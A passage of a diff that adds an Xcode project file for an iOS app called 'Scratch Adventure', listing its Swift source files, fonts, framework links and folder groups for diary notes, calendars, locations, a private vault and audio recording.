+		CEB2484C2DBF884700B62F2F /* PositionTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PositionTableViewCell.swift; sourceTree = "<group>"; };
+		CEB248502DBF9D9E00B62F2F /* ActivityTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ActivityTableViewCell.swift; sourceTree = "<group>"; };
+		CEB248522DBFA76300B62F2F /* ExperienceNoteTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ExperienceNoteTableViewCell.swift; sourceTree = "<group>"; };
+		CEB248542DBFAD3A00B62F2F /* AddPhotosView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddPhotosView.swift; sourceTree = "<group>"; };
+		CEE241482DB79D8600EBD2AA /* LeaderboardsViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LeaderboardsViewController.swift; sourceTree = "<group>"; };
+		CEE241492DB79D8700EBD2AA /* NotesViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NotesViewController.swift; sourceTree = "<group>"; };
+		CEE2414D2DB79FC100EBD2AA /* LeaderboardItemCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LeaderboardItemCell.swift; sourceTree = "<group>"; };
+		CEE241502DB7A02C00EBD2AA /* NoteTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NoteTableViewCell.swift; sourceTree = "<group>"; };
+		CEE241562DB7ADC000EBD2AA /* SheetContentViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SheetContentViewController.swift; sourceTree = "<group>"; };
+		CEE29C092DB63CD100854BC6 /* Scratch Adventure.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Scratch Adventure.app"; sourceTree = BUILT_PRODUCTS_DIR; };
+		CEE29C0C2DB63CD100854BC6 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
+		CEE29C0E2DB63CD100854BC6 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
+		CEE29C132DB63CD100854BC6 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		CEE29C152DB63CD300854BC6 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		CEE29C182DB63CD300854BC6 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		CEE29C1A2DB63CD300854BC6 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		CEE29C202DB63DC200854BC6 /* MonthCalendarViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MonthCalendarViewCell.swift; sourceTree = "<group>"; };
+		CEE29C212DB63DC200854BC6 /* MonthCalendarViewCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = MonthCalendarViewCell.xib; sourceTree = "<group>"; };
+		CEE29C222DB63DC200854BC6 /* MonthScrollPicker.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MonthScrollPicker.swift; sourceTree = "<group>"; };
+		CEE29C232DB63DC200854BC6 /* MonthScrollPicker.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = MonthScrollPicker.xib; sourceTree = "<group>"; };
+		CEE29C242DB63DC200854BC6 /* MonthScrollPicker+Protocols.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "MonthScrollPicker+Protocols.swift"; sourceTree = "<group>"; };
+		CEE29C262DB63DC200854BC6 /* Date+Days.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "Date+Days.swift"; sourceTree = "<group>"; };
+		CEE29C272DB63DC200854BC6 /* Date+Format.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "Date+Format.swift"; sourceTree = "<group>"; };
+		CEE29C282DB63DC200854BC6 /* DateInsertType.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DateInsertType.swift; sourceTree = "<group>"; };
+		CEE29C292DB63DC200854BC6 /* DateScrollItem.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DateScrollItem.swift; sourceTree = "<group>"; };
+		CEE29C2A2DB63DC200854BC6 /* DateScrollManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DateScrollManager.swift; sourceTree = "<group>"; };
+		CEE29C2B2DB63DC200854BC6 /* DateScrollPicker.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DateScrollPicker.swift; sourceTree = "<group>"; };
+		CEE29C2C2DB63DC200854BC6 /* DateScrollPicker.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = DateScrollPicker.xib; sourceTree = "<group>"; };
+		CEE29C2D2DB63DC200854BC6 /* DateScrollPicker+Protocols.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "DateScrollPicker+Protocols.swift"; sourceTree = "<group>"; };
+		CEE29C2E2DB63DC200854BC6 /* DateScrollPickerFormat.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DateScrollPickerFormat.swift; sourceTree = "<group>"; };
+		CEE29C2F2DB63DC200854BC6 /* DateViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DateViewCell.swift; sourceTree = "<group>"; };
+		CEE29C302DB63DC200854BC6 /* DateViewCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = DateViewCell.xib; sourceTree = "<group>"; };
+		CEE29C312DB63DC200854BC6 /* SeparatorViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SeparatorViewCell.swift; sourceTree = "<group>"; };
+		CEE29C322DB63DC200854BC6 /* SeparatorViewCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = SeparatorViewCell.xib; sourceTree = "<group>"; };
+		CEE29C332DB63DC200854BC6 /* UICollectionView+Fade.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "UICollectionView+Fade.swift"; sourceTree = "<group>"; };
+		CEE29C342DB63DC200854BC6 /* UICollectionViewCell+Fade.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "UICollectionViewCell+Fade.swift"; sourceTree = "<group>"; };
+		CEE29C352DB63DC200854BC6 /* UIView+Nib.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "UIView+Nib.swift"; sourceTree = "<group>"; };
+		CEE29C372DB63DC200854BC6 /* ZHCroppedDelegate.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ZHCroppedDelegate.swift; sourceTree = "<group>"; };
+		CEE29C382DB63DC200854BC6 /* ZHWaveformView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ZHWaveformView.swift; sourceTree = "<group>"; };
+		CEE29C392DB63DC200854BC6 /* ZHWaveformViewDelegate.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ZHWaveformViewDelegate.swift; sourceTree = "<group>"; };
+		CEE29C3B2DB63DC200854BC6 /* CenteredCollectionViewFlowLayout.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CenteredCollectionViewFlowLayout.swift; sourceTree = "<group>"; };
+		CEE29C3C2DB63DC200854BC6 /* CustomLoader.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CustomLoader.swift; sourceTree = "<group>"; };
+		CEE29C3D2DB63DC200854BC6 /* CustomLoaderView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CustomLoaderView.swift; sourceTree = "<group>"; };
+		CEE29C3E2DB63DC200854BC6 /* Extension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Extension.swift; sourceTree = "<group>"; };
+		CEE29C3F2DB63DC200854BC6 /* GradientButton.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = GradientButton.swift; sourceTree = "<group>"; };
+		CEE29C402DB63DC200854BC6 /* PagingCollectionViewLayout.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PagingCollectionViewLayout.swift; sourceTree = "<group>"; };
+		CEE29C412DB63DC200854BC6 /* RCValues.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RCValues.swift; sourceTree = "<group>"; };
+		CEE29C422DB63DC200854BC6 /* SwipeCardView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SwipeCardView.swift; sourceTree = "<group>"; };
+		CEE29C432DB63DC200854BC6 /* VPCollectionViewLayout.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = VPCollectionViewLayout.swift; sourceTree = "<group>"; };
+		CEE29C452DB63DC200854BC6 /* Poppins-Bold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Poppins-Bold.ttf"; sourceTree = "<group>"; };
+		CEE29C462DB63DC200854BC6 /* Poppins-Medium.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Poppins-Medium.ttf"; sourceTree = "<group>"; };
+		CEE29C472DB63DC200854BC6 /* Poppins-Regular.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Poppins-Regular.ttf"; sourceTree = "<group>"; };
+		CEE29C482DB63DC200854BC6 /* Poppins-SemiBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Poppins-SemiBold.ttf"; sourceTree = "<group>"; };
+		CEE29C9E2DB63DC300854BC6 /* HomeViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
+		CEE29CC12DB63DC300854BC6 /* addLoadingIndicator.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = addLoadingIndicator.swift; sourceTree = "<group>"; };
+		CEE29CC22DB63DC300854BC6 /* ExtensionProVersion.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ExtensionProVersion.swift; sourceTree = "<group>"; };
+		CEE29CC32DB63DC300854BC6 /* InAppPurchase.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = InAppPurchase.swift; sourceTree = "<group>"; };
+		CEE29CC42DB63DC300854BC6 /* LoadingIndicatorHUD.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LoadingIndicatorHUD.swift; sourceTree = "<group>"; };
+		CEE29CC52DB63DC300854BC6 /* NetworkManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NetworkManager.swift; sourceTree = "<group>"; };
+		CEE29CC62DB63DC300854BC6 /* Purchase functionality.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "Purchase functionality.swift"; sourceTree = "<group>"; };
+		CEE29CC82DB63DC300854BC6 /* UIActivityIndicatorView Extension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "UIActivityIndicatorView Extension.swift"; sourceTree = "<group>"; };
+		CEE29CCA2DB63DC300854BC6 /* ButtonTapAnimationExtension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ButtonTapAnimationExtension.swift; sourceTree = "<group>"; };
+		CEE29CCB2DB63DC300854BC6 /* ColorHelper.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ColorHelper.swift; sourceTree = "<group>"; };
+		CEE29CCC2DB63DC300854BC6 /* CustomeDateStackView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CustomeDateStackView.swift; sourceTree = "<group>"; };
+		CEE29CCD2DB63DC300854BC6 /* CustomNavigationBar.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CustomNavigationBar.swift; sourceTree = "<group>"; };
+		CEE29CCE2DB63DC300854BC6 /* FirestoreManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = FirestoreManager.swift; sourceTree = "<group>"; };
+		CEE29CCF2DB63DC300854BC6 /* FontHelper.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = FontHelper.swift; sourceTree = "<group>"; };
+		CEE29CD02DB63DC300854BC6 /* LocalizationHelper.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = LocalizationHelper.swift; sourceTree = "<group>"; };
+		CEE29CD12DB63DC300854BC6 /* MultiLanguage.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MultiLanguage.swift; sourceTree = "<group>"; };
+		CEE29CD22DB63DC300854BC6 /* OvulationCircularCalendarView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = OvulationCircularCalendarView.swift; sourceTree = "<group>"; };
+		CEE29CD32DB63DC300854BC6 /* PushNotificationManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PushNotificationManager.swift; sourceTree = "<group>"; };
+		CEE29CD42DB63DC300854BC6 /* ReviewAlertView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ReviewAlertView.swift; sourceTree = "<group>"; };
+		CEE29CD52DB63DC300854BC6 /* UIHelper.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIHelper.swift; sourceTree = "<group>"; };
+		CEE29D872DB664E100854BC6 /* CalenderViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CalenderViewController.swift; sourceTree = "<group>"; };
+		CEF8E2882DBA49C600C3D333 /* DateNoteViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DateNoteViewController.swift; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		CEE29C062DB63CD100854BC6 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				4D81CBA9716C579F1B7E36A2 /* Pods_Scratch_Adventure.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		0F4FF09004751554965C0B20 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				651F7FC6B45547F55968C1F4 /* Pods-Scratch Adventure.debug.xcconfig */,
+				5F5108B973FDDD8FA325C749 /* Pods-Scratch Adventure.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+		7EEAB8435347AAD1EC0AC50B /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				B29B8ED6C138521BB21E3F4B /* Pods_Scratch_Adventure.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		CE1DEC792DDF490E005C10AA /* WhereLocationVC */ = {
+			isa = PBXGroup;
+			children = (
+				CE1DEC7E2DDF4979005C10AA /* LocationItemSubCell.swift */,
+				CE1DEC7C2DDF4962005C10AA /* AddLocationItemCell.swift */,
+				CE1DEC7A2DDF4933005C10AA /* LocationItemCell.swift */,
+			);
+			path = WhereLocationVC;
+			sourceTree = "<group>";
+		};
+		CE1FFEF72DE088AA007A1527 /* PrivateVaultVC */ = {
+			isa = PBXGroup;
+			children = (
+				CE7A7A042DE5B7B300E26410 /* DeletevaultImagePopupViewController.swift */,
+				CE5B096D2DE4992E00AD01B4 /* ImagePickerBottomSheet.swift */,
+				CE1FFEF82DE088F0007A1527 /* VaultPinSetupViewController.swift */,
+				CE347CB72DE462F900D75873 /* PrivateVaultViewController.swift */,
+			);
+			path = PrivateVaultVC;
+			sourceTree = "<group>";
+		};
+		CE3214312DC37F330045015C /* MapVC */ = {
+			isa = PBXGroup;
+			children = (
+				CE3214322DC37F5B0045015C /* MapViewController.swift */,
+			);
+			path = MapVC;
+			sourceTree = "<group>";
+		};
+		CE3214362DC394570045015C /* MapVC */ = {
+			isa = PBXGroup;
+			children = (
+				CE3214372DC394A70045015C /* LocationContainTableViewCell.swift */,
+			);
+			path = MapVC;
+			sourceTree = "<group>";
+		};
+		CE406A382DE9D5B500C5193C /* Media Recorder */ = {
+			isa = PBXGroup;
+			children = (
+				CE406A392DE9D5C000C5193C /* MediaOptionCell.swift */,
+			);
+			path = "Media Recorder";
+			sourceTree = "<group>";
+		};
+		CE7A7A062DE5C7C700E26410 /* PrivateVault */ = {
+			isa = PBXGroup;
+			children = (
+				CE7A7A072DE5C7D400E26410 /* PrivateImageCell.swift */,
+			);
+			path = PrivateVault;
+			sourceTree = "<group>";
+		};
+		CE7A7A0B2DE5D30B00E26410 /* AudioRecording */ = {
+			isa = PBXGroup;
+			children = (
+				CE406A362DE9D45600C5193C /* AudioRecorderPopupViewController.swift */,
+				CE7A7A0C2DE5D30E00E26410 /* SexTrackerViewController.swift */,
+				CE406A342DE9CB4F00C5193C /* RecordAudioAlertViewController.swift */,
+			);
+			path = AudioRecording;
+			sourceTree = "<group>";
+		};
+		CE8ADAC72DB8FCE600D7543D /* NoteVC */ = {
+			isa = PBXGroup;
+			children = (
+				CE8ADAC82DB8FD0B00D7543D /* NoteTagesCollectionViewCell.swift */,
+			);
+			path = NoteVC;
+			sourceTree = "<group>";
+		};
+		CE8BF7F82DDB3CA400CFFE16 /* PositionVC */ = {
+			isa = PBXGroup;
+			children = (
+				CE8BF7FB2DDB3CDF00CFFE16 /* AddPositionViewController.swift */,
+				CE4CA7F52DDC7C2B00688365 /* AddActivityViewController.swift */,
+				CE4CA7F72DDC8FA300688365 /* AddCustomActivityViewController.swift */,
+			);
+			path = PositionVC;
+			sourceTree = "<group>";
+		};
+		CE8CFD662DBA5640000D111B /* Views */ = {
+			isa = PBXGroup;
+			children = (
+				CE37686F2DCA2D94000B0EBC /* LocationDetailCardView.swift */,
+				CE147DDC2DC235E8009BB637 /* PhotoGridView.swift */,
+				CE14CE4B2DC1024C001EA13C /* LocationView.swift */,
+				CEB248542DBFAD3A00B62F2F /* AddPhotosView.swift */,
+				CE8CFD642DBA5640000D111B /* CustomContainerView.swift */,
+				CE8CFD652DBA5640000D111B /* HorizontalCalendarView.swift */,
+			);
+			path = Views;
+			sourceTree = SOURCE_ROOT;
+		};
+		CE95F0792DDDDA10009C4F09 /* AddWhereLocation */ = {
+			isa = PBXGroup;
+			children = (
+				CE95F07A2DDDDA36009C4F09 /* WhereLocationListViewController.swift */,
+				CE1DEC772DDF2F89005C10AA /* AddMoreLocationViewController.swift */,
+			);
+			path = AddWhereLocation;
+			sourceTree = "<group>";
+		};
+		CEAE328D2DBB892600EC4AF4 /* AddDiaryNote */ = {
+			isa = PBXGroup;
+			children = (
+				CE14CE472DC0D2B5001EA13C /* LocationPickerViewController.swift */,
+				CEAE328E2DBB895D00EC4AF4 /* AddDiaryNoteViewController.swift */,
+				CE3768672DCA11F6000B0EBC /* AddDiaryNoteFilledViewController.swift */,
+			);
+			path = AddDiaryNote;
+			sourceTree = "<group>";
+		};
+		CEAE32902DBB8AB800EC4AF4 /* AddNote */ = {
+			isa = PBXGroup;
+			children = (
+				CE3768712DCA2DBB000B0EBC /* ExperienceFilledNoteTableViewCell.swift */,
+				CE37686D2DCA1C5E000B0EBC /* AddDiaryinitiatorTableCell.swift */,
+				CE37686B2DCA13A8000B0EBC /* NoteRatingTableCell.swift */,
+				CE32142E2DC36D040045015C /* LocationTableViewCell.swift */,
+				CEAE32912DBB8AE700EC4AF4 /* HorizontalCalenderTableCell.swift */,
+				CEAE32932DBB8FAD00EC4AF4 /* RatingTableCell.swift */,
+				CEAE32952DBBAD7700EC4AF4 /* AddDiaryContraceptionTableCell.swift */,
+				CEB2484C2DBF884700B62F2F /* PositionTableViewCell.swift */,
+				CEB248502DBF9D9E00B62F2F /* ActivityTableViewCell.swift */,
+				CEB248522DBFA76300B62F2F /* ExperienceNoteTableViewCell.swift */,
+			);
+			path = AddNote;
+			sourceTree = "<group>";
+		};
+		CEE2414F2DB79FE100EBD2AA /* HomeVC */ = {
+			isa = PBXGroup;
+			children = (
+				CEE2414D2DB79FC100EBD2AA /* LeaderboardItemCell.swift */,
+				CEE241502DB7A02C00EBD2AA /* NoteTableViewCell.swift */,
+			);
+			path = HomeVC;
+			sourceTree = "<group>";
+		};
+		CEE29C002DB63CD100854BC6 = {
+			isa = PBXGroup;
+			children = (
+				CEE29C0B2DB63CD100854BC6 /* Scratch Adventure */,
+				CEE29C0A2DB63CD100854BC6 /* Products */,
+				0F4FF09004751554965C0B20 /* Pods */,
+				7EEAB8435347AAD1EC0AC50B /* Frameworks */,
+			);
+			sourceTree = "<group>";
+		};
+		CEE29C0A2DB63CD100854BC6 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				CEE29C092DB63CD100854BC6 /* Scratch Adventure.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		CEE29C0B2DB63CD100854BC6 /* Scratch Adventure */ = {
+			isa = PBXGroup;
+			children = (
+				CEE29C0C2DB63CD100854BC6 /* AppDelegate.swift */,
+				CEE29C0E2DB63CD100854BC6 /* SceneDelegate.swift */,
+				CEE29C662DB63DC300854BC6 /* DataManager */,
+				CEE29C492DB63DC200854BC6 /* Fonts */,
+				CEE29CD62DB63DC300854BC6 /* Helpers */,
+				CEE29CE62DB63DC300854BC6 /* OnBoardingScreens */,
+				CE8CFD662DBA5640000D111B /* Views */,
+				CEE29C442DB63DC200854BC6 /* Utilities */,
+				CEE29C892DB63DC300854BC6 /* TableViewCells */,
+				CEE29C5C2DB63DC300854BC6 /* CollectionViewCells */,
+				CEE29CC02DB63DC300854BC6 /* ViewControllers */,
+				CEE29C122DB63CD100854BC6 /* Main.storyboard */,
+				CEE29C152DB63CD300854BC6 /* Assets.xcassets */,
+				CEE29C172DB63CD300854BC6 /* LaunchScreen.storyboard */,
+				CEE29C1A2DB63CD300854BC6 /* Info.plist */,
+			);
+			path = "Scratch Adventure";
+			sourceTree = "<group>";
+		};
+		CEE29C252DB63DC200854BC6 /* MonthScrollPicker */ = {
+			isa = PBXGroup;
+			children = (
+				CEE29C202DB63DC200854BC6 /* MonthCalendarViewCell.swift */,
+				CEE29C212DB63DC200854BC6 /* MonthCalendarViewCell.xib */,
+				CEE29C222DB63DC200854BC6 /* MonthScrollPicker.swift */,
+				CEE29C232DB63DC200854BC6 /* MonthScrollPicker.xib */,
+				CEE29C242DB63DC200854BC6 /* MonthScrollPicker+Protocols.swift */,
+			);
+			path = MonthScrollPicker;
+			sourceTree = "<group>";
+		};
+		CEE29C362DB63DC200854BC6 /* DateScroll */ = {
+			isa = PBXGroup;
+			children = (
+				CEE29C252DB63DC200854BC6 /* MonthScrollPicker */,
+				CEE29C262DB63DC200854BC6 /* Date+Days.swift */,
+				CEE29C272DB63DC200854BC6 /* Date+Format.swift */,
+				CEE29C282DB63DC200854BC6 /* DateInsertType.swift */,
+				CEE29C292DB63DC200854BC6 /* DateScrollItem.swift */,
+				CEE29C2A2DB63DC200854BC6 /* DateScrollManager.swift */,
+				CEE29C2B2DB63DC200854BC6 /* DateScrollPicker.swift */,
+				CEE29C2C2DB63DC200854BC6 /* DateScrollPicker.xib */,
+				CEE29C2D2DB63DC200854BC6 /* DateScrollPicker+Protocols.swift */,
+				CEE29C2E2DB63DC200854BC6 /* DateScrollPickerFormat.swift */,
+				CEE29C2F2DB63DC200854BC6 /* DateViewCell.swift */,
+				CEE29C302DB63DC200854BC6 /* DateViewCell.xib */,
+				CEE29C312DB63DC200854BC6 /* SeparatorViewCell.swift */,
+				CEE29C322DB63DC200854BC6 /* SeparatorViewCell.xib */,
+				CEE29C332DB63DC200854BC6 /* UICollectionView+Fade.swift */,
+				CEE29C342DB63DC200854BC6 /* UICollectionViewCell+Fade.swift */,
+				CEE29C352DB63DC200854BC6 /* UIView+Nib.swift */,
+			);
+			path = DateScroll;
+			sourceTree = "<group>";
+		};
+		CEE29C3A2DB63DC200854BC6 /* ZHWaveform */ = {
+			isa = PBXGroup;
+			children = (
+				CEE29C372DB63DC200854BC6 /* ZHCroppedDelegate.swift */,
+				CEE29C382DB63DC200854BC6 /* ZHWaveformView.swift */,
+				CEE29C392DB63DC200854BC6 /* ZHWaveformViewDelegate.swift */,
+			);
+			path = ZHWaveform;
+			sourceTree = "<group>";
+		};
+		CEE29C442DB63DC200854BC6 /* Utilities */ = {
+			isa = PBXGroup;
+			children = (
+				CEE29C362DB63DC200854BC6 /* DateScroll */,
+				CEE29C3A2DB63DC200854BC6 /* ZHWaveform */,
+				CEE29C3B2DB63DC200854BC6 /* CenteredCollectionViewFlowLayout.swift */,
+				CEE29C3C2DB63DC200854BC6 /* CustomLoader.swift */,
+				CEE29C3D2DB63DC200854BC6 /* CustomLoaderView.swift */,
+				CEE29C3E2DB63DC200854BC6 /* Extension.swift */,
+				CEE29C3F2DB63DC200854BC6 /* GradientButton.swift */,
+				CEE29C402DB63DC200854BC6 /* PagingCollectionViewLayout.swift */,
+				CEE29C412DB63DC200854BC6 /* RCValues.swift */,
+				CEE29C422DB63DC200854BC6 /* SwipeCardView.swift */,
+				CEE29C432DB63DC200854BC6 /* VPCollectionViewLayout.swift */,
+			);
+			path = Utilities;
+			sourceTree = SOURCE_ROOT;
+		};
+		CEE29C492DB63DC200854BC6 /* Fonts */ = {
+			isa = PBXGroup;
+			children = (
+				CEE29C452DB63DC200854BC6 /* Poppins-Bold.ttf */,
+				CEE29C462DB63DC200854BC6 /* Poppins-Medium.ttf */,
+				CEE29C472DB63DC200854BC6 /* Poppins-Regular.ttf */,
+				CEE29C482DB63DC200854BC6 /* Poppins-SemiBold.ttf */,
+			);
+			path = Fonts;
+			sourceTree = SOURCE_ROOT;
+		};
+		CEE29C5C2DB63DC300854BC6 /* CollectionViewCells */ = {
+			isa = PBXGroup;
+			children = (
+				CE406A382DE9D5B500C5193C /* Media Recorder */,
+				CE7A7A062DE5C7C700E26410 /* PrivateVault */,
+				CE8ADAC72DB8FCE600D7543D /* NoteVC */,
+			);
+			path = CollectionViewCells;
+			sourceTree = SOURCE_ROOT;
+		};
+		CEE29C662DB63DC300854BC6 /* DataManager */ = {
+			isa = PBXGroup;
+			children = (
+				CE14CE492DC0DF8C001EA13C /* LocationManager.swift */,
+				CE8BF7FD2DDB5D2900CFFE16 /* PositionDataManager.swift */,
+				CE5B096F2DE4A00200AD01B4 /* VaultDataManager.swift */,
+			);
+			path = DataManager;
+			sourceTree = SOURCE_ROOT;
+		};
+		CEE29C892DB63DC300854BC6 /* TableViewCells */ = {
+			isa = PBXGroup;
+			children = (
+				CE1DEC792DDF490E005C10AA /* WhereLocationVC */,
+				CE3214362DC394570045015C /* MapVC */,
+				CEAE32902DBB8AB800EC4AF4 /* AddNote */,
+				CEE2414F2DB79FE100EBD2AA /* HomeVC */,
+			);
+			path = TableViewCells;
+			sourceTree = SOURCE_ROOT;
+		};
+		CEE29CA02DB63DC300854BC6 /* HomeVC */ = {
+			isa = PBXGroup;
+			children = (
+				CEE241562DB7ADC000EBD2AA /* SheetContentViewController.swift */,
+				CEE29C9E2DB63DC300854BC6 /* HomeViewController.swift */,
+				CEE241482DB79D8600EBD2AA /* LeaderboardsViewController.swift */,
+				CEE241492DB79D8700EBD2AA /* NotesViewController.swift */,
+			);
+			path = HomeVC;
+			sourceTree = "<group>";
+		};
+		CEE29CC02DB63DC300854BC6 /* ViewControllers */ = {
+			isa = PBXGroup;
+			children = (
+				CE7A7A0B2DE5D30B00E26410 /* AudioRecording */,
+				CE1FFEF72DE088AA007A1527 /* PrivateVaultVC */,
+				CE95F0792DDDDA10009C4F09 /* AddWhereLocation */,
+				CE8BF7F82DDB3CA400CFFE16 /* PositionVC */,
+				CE3214312DC37F330045015C /* MapVC */,
+				CEE29D862DB664BB00854BC6 /* CalenderVC */,
+				CEAE328D2DBB892600EC4AF4 /* AddDiaryNote */,
+				CEE29CA02DB63DC300854BC6 /* HomeVC */,
+			);
+			path = ViewControllers;
+			sourceTree = SOURCE_ROOT;
+		};
+		CEE29CC92DB63DC300854BC6 /* IAPHandler */ = {
+			isa = PBXGroup;
+			children = (
+				CEE29CC12DB63DC300854BC6 /* addLoadingIndicator.swift */,
+				CEE29CC22DB63DC300854BC6 /* ExtensionProVersion.swift */,
